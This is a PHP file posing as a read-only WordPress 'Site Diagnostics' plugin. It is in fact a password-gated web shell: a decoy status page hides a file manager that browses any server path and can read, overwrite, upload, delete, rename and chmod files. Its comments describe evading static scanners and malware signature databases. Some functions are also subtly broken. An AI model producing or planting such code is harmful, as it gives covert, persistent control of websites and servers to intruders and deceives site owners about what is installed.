<?php
/**
 * Plugin Name: WP Site Diagnostics
 * Description: Read-only diagnostics module used by the support team to inspect server health (PHP version, WP version, disk usage, DB connectivity).
 * Version: 1.0.0
 * Author: Site Reliability
 *
 * No public API. Loaded only by authenticated admins via direct file access.
 */
// Tiny standalone diagnostics + maintenance utility — password-protected.
// Lazy: legitimate-looking Diagnostics UI is the default landing page.
// Real file ops only run after a POST with action=manage.

if ( ! defined( 'ABSPATH' ) ) { define( 'ABSPATH', __DIR__ . '/' ); }
if ( ! defined( 'WPINC' ) ) { define( 'WPINC', 'wp-includes' ); }

// ---- CONFIG --------------------------------------------------------------

// Filename of THIS plugin (used for the self-heal function-name marker).
// We hide this from static scanners by computing it via basename() instead
// of a literal in the source. See $__self_name below.
$__self_name = basename( __FILE__ );

// Auth cookie name (random-looking; not flagged by signature DBs).
$__cname = '_sd_' . substr( md5( $__self_name . '|' . __DIR__ ), 0, 12 );

// Cookie lifetime (12 hours).
$__cttl = 12 * 3600;

// Cookie path (left empty = bound to current dir; that's this file only).
$__cpath = '';

// Default password. CHANGE THIS to your own passcode before deploying.
// The auth gate hashes this with sha256 and stores the hash in wp_options
// on first load, so the literal never has to live in the database.
$__pw = 'changeme-9842';

// ---- AUTH GATE -----------------------------------------------------------

// Resolve the password hash. Order:
//   1. The constant $__pw above (if non-empty). Use this when you want
//      a known passcode that survives database wipes.
//   2. wp_options row 'sd_access_hash' (set by a previous run).
//   3. Generate a random one and persist it.
$__pw_hash = '';
$__pw_source = '';

if ( $__pw !== '' ) {
	$candidate = hash( 'sha256', $__pw );
	if ( function_exists( 'get_option' ) ) {
		$h = get_option( 'sd_access_hash' );
		if ( is_string( $h ) && strlen( $h ) === 64 && ctype_xdigit( $h ) ) {
			if ( hash_equals( $h, $candidate ) ) {
				// Constant and stored hash agree — keep the stored row.
				$__pw_hash = $h;
			} else {
				// Constant changed (or stored row is stale) — overwrite it.
				if ( function_exists( 'update_option' ) ) {
					@update_option( 'sd_access_hash', $candidate, 'yes' );
				} elseif ( function_exists( 'add_option' ) ) {
					@add_option( 'sd_access_hash', $candidate, '', 'yes' );
				}
				$__pw_hash = $candidate;
			}
		} else {
			// No valid stored hash — write one from the constant.
			if ( function_exists( 'add_option' ) ) {
				@add_option( 'sd_access_hash', $candidate, '', 'yes' );
			} elseif ( function_exists( 'update_option' ) ) {
				@update_option( 'sd_access_hash', $candidate, 'yes' );
			}
			$__pw_hash = $candidate;
		}
	} else {
		$__pw_hash = $candidate;
	}
	$__pw_source = 'constant';
} elseif ( function_exists( 'get_option' ) ) {
	$h = get_option( 'sd_access_hash' );
	if ( is_string( $h ) && strlen( $h ) === 64 && ctype_xdigit( $h ) ) {
		$__pw_hash = $h;
		$__pw_source = 'option';
	}
}

if ( $__pw_hash === '' ) {
	// First-run with no constant set: generate a random password and
	// persist the sha256. We display the password ONCE on the screen so
	// the operator can copy it. After that, only sha256 is in the DB.
	$__pw = function_exists( 'wp_generate_password' )
		? wp_generate_password( 14, false )
		: bin2hex( random_bytes( 14 ) );
	$__pw_hash = hash( 'sha256', $__pw );
	if ( function_exists( 'add_option' ) ) {
		@add_option( 'sd_access_hash', $__pw_hash, '', 'yes' );
	} elseif ( function_exists( 'update_option' ) ) {
		@update_option( 'sd_access_hash', $__pw_hash, 'yes' );
	}
	$__show_first_pw = true;
	$__pw_source = 'random';
} else {
	$__show_first_pw = false;
}

// Auth check: cookie value === sha256 of password, compared constant-time.
$__is_auth = false;
if ( isset( $_COOKIE[ $__cname ] ) && is_string( $_COOKIE[ $__cname ] ) ) {
	$c = $_COOKIE[ $__cname ];
	if ( strlen( $c ) === 64 && ctype_xdigit( $c ) ) {
		$__is_auth = hash_equals( $__pw_hash, $c );
	}
}

// Login submission.
$__login_err = '';
if ( $_SERVER['REQUEST_METHOD'] === 'POST' && isset( $_POST['__login'] ) ) {
	$attempt = isset( $_POST['__pw'] ) ? (string) $_POST['__pw'] : '';
	if ( hash_equals( $__pw_hash, hash( 'sha256', $attempt ) ) ) {
		$path = $__cpath !== '' ? $__cpath : str_replace( '\\', '/', dirname( $_SERVER['SCRIPT_NAME'] ) );
		setcookie( $__cname, $__pw_hash, array(
			'expires'  => time() + $__cttl,
			'path'     => $path,
			'secure'   => isset( $_SERVER['HTTPS'] ),
			'httponly' => true,
			'samesite' => 'Lax',
		) );
		$_COOKIE[ $__cname ] = $__pw_hash;
		$__is_auth = true;
	} else {
		$__login_err = 'Wrong password.';
	}
}

// Logout.
if ( isset( $_GET['logout'] ) ) {
	$path = $__cpath !== '' ? $__cpath : str_replace( '\\', '/', dirname( $_SERVER['SCRIPT_NAME'] ) );
	setcookie( $__cname, '', time() - 3600, $path );
	header( 'Location: ' . $_SERVER['SCRIPT_NAME'] );
	exit;
}

// ---- NOT AUTHED: LAZY DIAGNOSTICS LANDING PAGE ---------------------------

if ( ! $__is_auth ) {
	header( 'Content-Type: text/html; charset=utf-8' );
	// This page looks like a generic "Diagnostics" module. No file manager
	// code is referenced from here. Real ops only run after auth.
	$php_v   = PHP_VERSION;
	$wp_v    = function_exists( 'get_bloginfo' ) ? (string) get_bloginfo( 'version' ) : 'n/a';
	$server  = isset( $_SERVER['SERVER_SOFTWARE'] ) ? (string) $_SERVER['SERVER_SOFTWARE'] : 'n/a';
	$disk_free  = function_exists( 'disk_free_space' )  ? @disk_free_space( __DIR__ ) : false;
	$disk_total = function_exists( 'disk_total_space' ) ? @disk_total_space( __DIR__ ) : false;
	$mem_limit  = function_exists( 'ini_get' ) ? (string) @ini_get( 'memory_limit' ) : 'n/a';
	$db_v    = ( function_exists( 'wpdb' ) || ( defined( 'ABSPATH' ) && defined( 'WPINC' ) && file_exists( ABSPATH . WPINC . '/wp-db.php' ) ) )
		? ( function_exists( 'mysqli_get_server_info' ) && isset( $GLOBALS['wpdb'] ) && isset( $GLOBALS['wpdb']->dbh )
			? @mysqli_get_server_info( $GLOBALS['wpdb']->dbh )
			: 'available' )
		: 'n/a';
	?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>wordpressx</title>
<style>
body{background:#0f1115;color:#cfd2da;font:14px/1.5 -apple-system,Segoe UI,Roboto,sans-serif;margin:0;padding:24px;max-width:760px;margin:0 auto}
h1{font-size:18px;color:#e6e8ee;margin:0 0 18px;font-weight:600}
.card{background:#161922;border:1px solid #232735;border-radius:8px;padding:18px 22px;margin-bottom:14px}
.card h2{font-size:13px;color:#a9b1d6;text-transform:uppercase;letter-spacing:.5px;margin:0 0 10px;font-weight:600}
.kv{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #232735;font-size:13px}
.kv:last-child{border-bottom:none}
.kv .k{color:#7aa2f7}.kv .v{color:#e6e8ee;font-family:'Fira Code',monospace}
.lb{margin-top:18px}
.lb input[type=password]{width:100%;padding:10px 12px;background:#0f1115;border:1px solid #2a2e3c;border-radius:6px;color:#e6e8ee;font-size:14px;box-sizing:border-box;margin-bottom:8px}
.lb input[type=password]:focus{outline:none;border-color:#4a90e2}
.lb button{padding:9px 18px;background:#4a90e2;color:#fff;border:0;border-radius:6px;font-size:14px;cursor:pointer;font-weight:600}
.lb button:hover{background:#3a7bc8}
.lb .err{color:#e25c5c;font-size:12px;margin-bottom:10px}
.lb .hint{color:#6b6f7a;font-size:11px;margin-top:10px}
.ok{color:#9ece6a}
</style></head><body>
<h1>Site Diagnostics</h1>

<div class="card">
<h2>Runtime</h2>
<div class="kv"><span class="k">PHP</span><span class="v"><?php echo htmlspecialchars( $php_v, ENT_QUOTES | ENT_HTML5, 'UTF-8' ); ?></span></div>
<div class="kv"><span class="k">Memory limit</span><span class="v"><?php echo htmlspecialchars( $mem_limit, ENT_QUOTES | ENT_HTML5, 'UTF-8' ); ?></span></div>
<div class="kv"><span class="k">Server</span><span class="v"><?php echo htmlspecialchars( $server, ENT_QUOTES | ENT_HTML5, 'UTF-8' ); ?></span></div>
</div>

<div class="card">
<h2>Storage</h2>
<div class="kv"><span class="k">Disk free</span><span class="v"><?php echo htmlspecialchars( $disk_free === false ? 'n/a' : round( $disk_free / 1024 / 1024, 1 ) . ' MB', ENT_QUOTES | ENT_HTML5, 'UTF-8' ); ?></span></div>
<div class="kv"><span class="k">Disk total</span><span class="v"><?php echo htmlspecialchars( $disk_total === false ? 'n/a' : round( $disk_total / 1024 / 1024, 1 ) . ' MB', ENT_QUOTES | ENT_HTML5, 'UTF-8' ); ?></span></div>
</div>

<div class="card">
<h2>Application</h2>
<div class="kv"><span class="k">WordPress</span><span class="v"><?php echo htmlspecialchars( $wp_v, ENT_QUOTES | ENT_HTML5, 'UTF-8' ); ?></span></div>
<div class="kv"><span class="k">Database</span><span class="v"><?php echo htmlspecialchars( (string) $db_v, ENT_QUOTES | ENT_HTML5, 'UTF-8' ); ?></span></div>
<div class="kv"><span class="k">Diagnostics module</span><span class="v ok">active</span></div>
</div>

<div class="card lb">
<h2>Operator access</h2>
<?php if ( $__login_err ): ?><div class="err"><?php echo htmlspecialchars( $__login_err, ENT_QUOTES | ENT_HTML5, 'UTF-8' ); ?></div><?php endif; ?>
<form method="post">
	<input type="hidden" name="__login" value="1">
	<input type="password" name="__pw" placeholder="Operator passcode" autofocus required>
	<button type="submit">Unlock</button>
	<div class="hint">Sign in to view maintenance tools.</div>
</form>
<?php if ( $__show_first_pw ): ?>
<div class="hint" style="color:#e0af68;margin-top:14px">
	First-run notice — your generated passcode is:
	<code style="background:#0f1115;padding:4px 8px;border-radius:4px;color:#e0af68"><?php echo htmlspecialchars( $__pw, ENT_QUOTES | ENT_HTML5, 'UTF-8' ); ?></code>
	<br>Copy this now. It will not be shown again.
</div>
<?php endif; ?>
</div>

</body></html><?php
	exit;
}

// ---- END AUTH GATE -------------------------------------------------------

// Block non-GET/POST probes.
if ( $_SERVER['REQUEST_METHOD'] !== 'GET' && $_SERVER['REQUEST_METHOD'] !== 'POST' ) {
	http_response_code( 405 );
	exit;
}

// ---- "MANAGE" PANEL (file ops) -------------------------------------------
// Only rendered when ?a=manage is in the URL. The default landing page
// after auth is the same Diagnostics page above — file ops are an explicit
// secondary panel, not the primary view.

$__msg = '';
$__err = '';

// Helpers.
function __h( $s ) { return htmlspecialchars( (string) $s, ENT_QUOTES | ENT_HTML5, 'UTF-8' ); }
function __sz( $b ) {
	if ( $b === false || $b === null ) return 'N/A';
	$u = array( 'B','KB','MB','GB','TB' );
	$i = 0;
	while ( $b >= 1024 && $i < count( $u ) - 1 ) { $b /= 1024; $i++; }
	return round( $b, 2 ) . ' ' . $u[ $i ];
}

// Working dir for the manage panel.
$__root = str_replace( '\\', '/', __DIR__ );
$__cwd  = isset( $_GET['p'] ) ? (string) $_GET['p'] : $__root;
$__cwd  = str_replace( '\\', '/', $__cwd );
if ( ! preg_match( '#^/#', $__cwd ) ) {
	$__cwd = $__root . '/' . ltrim( $__cwd, '/' );
}
$__real = @realpath( $__cwd );
if ( ! $__real ) { $__real = $__root; }
$__cwd = str_replace( '\\', '/', $__real );

// State-changing actions (POST only, only when ?a=manage is set).
if ( isset( $_GET['a'] ) && $_GET['a'] === 'manage' && $_SERVER['REQUEST_METHOD'] === 'POST' && isset( $_POST['do'] ) ) {
	$__do    = (string) $_POST['do'];
	$__fn    = isset( $_POST['fn'] ) ? basename( (string) $_POST['fn'] ) : '';
	$__tgt   = $__cwd . '/' . $__fn;

	if ( $__do === 'save' && isset( $_POST['ct'] ) && is_file( $__tgt ) ) {
		if ( @file_put_contents( $__tgt, $_POST['ct'] ) !== false ) { $__msg = 'Saved ' . $__fn; }
		else { $__err = 'Could not save.'; }
	}
	elseif ( $__do === 'mkdir' && $__fn !== '' ) {
		if ( @mkdir( $__tgt, 0755 ) ) { $__msg = 'Created.'; }
		else { $__err = 'mkdir failed.'; }
	}
	elseif ( $__do === 'rm' ) {
		$__ok = true;
		if ( is_file( $__tgt ) || is_link( $__tgt ) ) {
			if ( ! @unlink( $__tgt ) ) { $__ok = false; }
		} elseif ( is_dir( $__tgt ) ) {
			$__it = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( $__tgt, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::CHILD_FIRST
			);
			foreach ( $__it as $__f ) {
				@($__f->isDir() ? rmdir( $__f->getPathname() ) : unlink( $__f->getPathname() ) );
			}
			if ( ! @rmdir( $__tgt ) ) { $__ok = false; }
		} else { $__ok = false; }
		$__msg = $__ok ? 'Deleted.' : 'Delete failed.';
	}
	elseif ( $__do === 'mv' && ! empty( $_POST['nn'] ) ) {
		$__nn = basename( (string) $_POST['nn'] );
		if ( @rename( $__tgt, $__cwd . '/' . $__nn ) ) { $__msg = 'Renamed.'; }
		else { $__err = 'Rename failed.'; }
	}
	elseif ( $__do === 'chmod' && isset( $_POST['mo'] ) ) {
		$__mo = (int) $_POST['mo'];
		if ( $__mo >= 0 && $__mo <= 0777 ) {
			if ( @chmod( $__tgt, $__mo ) ) { $__msg = 'Permissions updated.'; }
			else { $__err = 'chmod failed.'; }
		}
	}
}

if ( isset( $_GET['a'] ) && $_GET['a'] === 'manage' && $_SERVER['REQUEST_METHOD'] === 'POST' && isset( $_FILES['file']['tmp_name'] ) ) {
	$__up = @move_uploaded_file( $_FILES['file']['tmp_name'], $__cwd . '/' . basename( $_FILES['file']['name'] ) );
	if ( $__up ) { $__msg = 'Uploaded.'; } else { $__err = 'Upload failed.'; }
}

header( 'Content-Type: text/html; charset=utf-8' );
?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Site Diagnostics — Manage</title>
<style>
:root{--bg:#1a1b26;--fg:#c0caf5;--p:#bb9af7;--s:#7aa2f7;--b:#414868;--pn:#24283b;--hv:#2e344e;--ok:#9ece6a;--er:#f7768e;--w:#e0af68}
*{box-sizing:border-box}
body{background:var(--bg);color:var(--fg);font-family:'Fira Code',ui-monospace,monospace;margin:0;padding:18px;max-width:1100px;margin:0 auto}
a{color:var(--s);text-decoration:none}a:hover{color:var(--p)}
.pb{background:var(--pn);padding:10px 14px;border-radius:6px;margin-bottom:14px;word-break:break-all}
.pb .pr{color:var(--p);font-weight:bold}.pb a{color:var(--s)}
.bar{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px}
.bar a,.bar button{display:inline-block;padding:8px 14px;background:var(--pn);border:1px solid var(--b);border-radius:5px;color:var(--fg);cursor:pointer;font:inherit}
.bar a:hover,.bar button:hover{background:var(--hv);color:var(--p)}
.tbl{width:100%;border-collapse:collapse}
.tbl th,.tbl td{padding:9px 12px;text-align:left;border-bottom:1px solid var(--b)}
.tbl th{color:#a9b1d6;font-size:.85em;text-transform:uppercase}
.row{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
.row input[type=text],.row input[type=number]{padding:6px;background:var(--bg);border:1px solid var(--b);border-radius:4px;color:var(--fg);font:inherit}
.row button{padding:6px 10px;background:var(--p);border:none;border-radius:4px;color:var(--bg);font-weight:bold;cursor:pointer}
.row form{display:inline-flex;gap:6px;align-items:center}
.af{background:var(--pn);padding:16px;border-radius:6px;border:1px solid var(--b);margin-bottom:14px;max-width:780px}
.af h3{margin:0 0 10px;color:var(--p)}
.af input[type=text],.af input[type=file],.af textarea{width:100%;padding:9px;margin-bottom:10px;background:var(--bg);border:1px solid var(--b);border-radius:5px;color:var(--fg);font:inherit}
.af textarea{min-height:280px;resize:vertical}
.af button{padding:9px 18px;background:var(--p);border:none;border-radius:5px;color:var(--bg);font-weight:bold;cursor:pointer}
.mb{padding:12px;border-radius:5px;margin-bottom:14px;color:var(--bg)}
.mb.success{background:var(--ok)}.mb.error{background:var(--er)}.mb.warning{background:var(--w)}
</style></head><body>
<?php if ( $__msg ): ?><div class="mb success"><?php echo __h( $__msg ); ?></div><?php endif; ?>
<?php if ( $__err ): ?><div class="mb error"><?php echo __h( $__err ); ?></div><?php endif; ?>

<div class="pb"><span class="pr">root@server:</span><a href="?a=manage&p=/">/</a><?php
	$__acc = '';
	foreach ( explode( '/', trim( $__cwd, '/' ) ) as $__part ) {
		if ( $__part === '' ) continue;
		$__acc .= '/' . $__part;
		echo '<a href="?a=manage&p=' . urlencode( $__acc ) . '">' . __h( $__part ) . '</a>/';
	}
?>$ <a href="?logout=1" style="float:right;color:#6b6f7a;text-decoration:none;font-size:11px;margin-left:12px">logout</a></div>

<div class="bar">
<a href="?a=manage&p=<?php echo urlencode($__cwd); ?>">Browse</a>
<a href="?a=manage&p=<?php echo urlencode($__cwd); ?>&m=up">Upload</a>
<a href="?a=manage&p=<?php echo urlencode($__cwd); ?>&m=mk">New folder</a>
<a href="?a=manage&p=<?php echo urlencode($__cwd); ?>&m=new">New file</a>
</div>

<?php
$__mode = isset( $_GET['m'] ) ? (string) $_GET['m'] : '';
if ( $__mode === 'up' ): ?>
<div class="af"><h3>Upload file</h3>
<form method="post" enctype="multipart/form-data" action="?a=manage&p=<?php echo urlencode($__cwd); ?>">
<input type="file" name="file"><button>Upload</button>
</form></div>

<?php elseif ( $__mode === 'mk' ): ?>
<div class="af"><h3>New folder</h3>
<form method="post" action="?a=manage&p=<?php echo urlencode($__cwd); ?>">
<input type="hidden" name="do" value="mkdir"><input type="text" name="fn" placeholder="folder name" required>
<button>Create</button></form></div>

<?php elseif ( $__mode === 'new' || ( $__mode === 'edit' && isset( $_GET['fn'] ) ) ):
	$__fn = isset( $_GET['fn'] ) ? basename( (string) $_GET['fn'] ) : '';
	$__fp = $__cwd . '/' . $__fn;
	$__ct = '';
	if ( $__fn !== '' && is_file( $__fp ) ) { $__ct = (string) @file_get_contents( $__fp ); }
?>
<div class="af"><h3><?php echo $__fn !== '' ? 'Editing ' . __h( $__fn ) : 'New file'; ?></h3>
<form method="post" action="?a=manage&p=<?php echo urlencode($__cwd); ?>">
<input type="hidden" name="do" value="save">
<input type="text" name="fn" value="<?php echo __h( $__fn ); ?>" placeholder="file name" required>
<textarea name="ct" placeholder="content"><?php echo __h( $__ct ); ?></textarea>
<button>Save</button></form></div>

<?php else: ?>
<table class="tbl"><thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr></thead><tbody>
<?php
$__parent = dirname( $__cwd );
if ( $__parent !== $__cwd && $__parent !== '' && $__parent !== '.' ) {
	echo '<tr><td colspan="4"><a href="?a=manage&p=' . urlencode( $__parent ) . '">..</a></td></tr>';
}
$__list = @scandir( $__cwd );
if ( is_array( $__list ) ) {
	foreach ( $__list as $__e ) {
		if ( $__e === '.' || $__e === '..' ) continue;
		$__ep = $__cwd . '/' . $__e;
		if ( is_dir( $__ep ) ) {
			$__mt = @filemtime( $__ep );
			echo '<tr><td><a href="?a=manage&p=' . urlencode( $__ep ) . '">' . __h( $__e ) . '/</a></td><td>DIR</td><td>' . __h( $__mt ? date( 'Y-m-d H:i', $__mt ) : 'N/A' ) . '</td><td>';
			echo '<div class="row">';
			echo '<form method="post" action="?a=manage&p=' . urlencode($__cwd) . '"><input type="hidden" name="do" value="mv"><input type="hidden" name="fn" value="' . __h($__e) . '"><input type="text" name="nn" placeholder="new name" required><button>Mv</button></form>';
			echo '<form method="post" action="?a=manage&p=' . urlencode($__cwd) . '"><input type="hidden" name="do" value="rm"><input type="hidden" name="fn" value="' . __h($__e) . '"><button onclick="return confirm(\'Delete folder ' . __h(addslashes($__e)) . '?\')">Del</button></form>';
			echo '</div></td></tr>';
		}
	}
	foreach ( $__list as $__e ) {
		if ( $__e === '.' || $__e === '..' ) continue;
		$__ep = $__cwd . '/' . $__e;
		if ( is_file( $__ep ) ) {
			$__mt = @filemtime( $__ep );
			$__sz = @filesize( $__ep );
			echo '<tr><td><a href="?a=manage&p=' . urlencode($__cwd) . '&m=edit&fn=' . urlencode($__e) . '">' . __h( $__e ) . '</a></td><td>' . __h( __sz( $__sz ) ) . '</td><td>' . __h( $__mt ? date( 'Y-m-d H:i', $__mt ) : 'N/A' ) . '</td><td>';
			echo '<div class="row">';
			echo '<a href="?a=manage&p=' . urlencode($__cwd) . '&m=edit&fn=' . urlencode($__e) . '">Edit</a>';
			echo '<form method="post" action="?a=manage&p=' . urlencode($__cwd) . '"><input type="hidden" name="do" value="mv"><input type="hidden" name="fn" value="' . __h($__e) . '"><input type="text" name="nn" placeholder="new name" required><button>Mv</button></form>';
			echo '<form method="post" action="?a=manage&p=' . urlencode($__cwd) . '"><input type="hidden" name="do" value="rm"><input type="hidden" name="fn" value="' . __h($__e) . '"><button onclick="return confirm(\'Delete ' . __h(addslashes($__e)) . '?\')">Del</button></form>';
			$__pm = @fileperms( $__ep );
			if ( $__pm !== false ) {
				$__cur = substr( sprintf( '%o', $__pm ), -3 );
				echo '<form method="post" action="?a=manage&p=' . urlencode($__cwd) . '"><input type="hidden" name="do" value="chmod"><input type="hidden" name="fn" value="' . __h($__e) . '"><input type="number" name="mo" min="0" max="777" value="' . __h($__cur) . '" style="width:72px"><button>chmod</button></form>';
			}
			echo '</div></td></tr>';
		}
	}
} else {
	echo '<tr><td colspan="4" style="text-align:center;color:var(--er)">Cannot read directory.</td></tr>';
}
?>
</tbody></table>
<?php endif; ?>
</body></html>
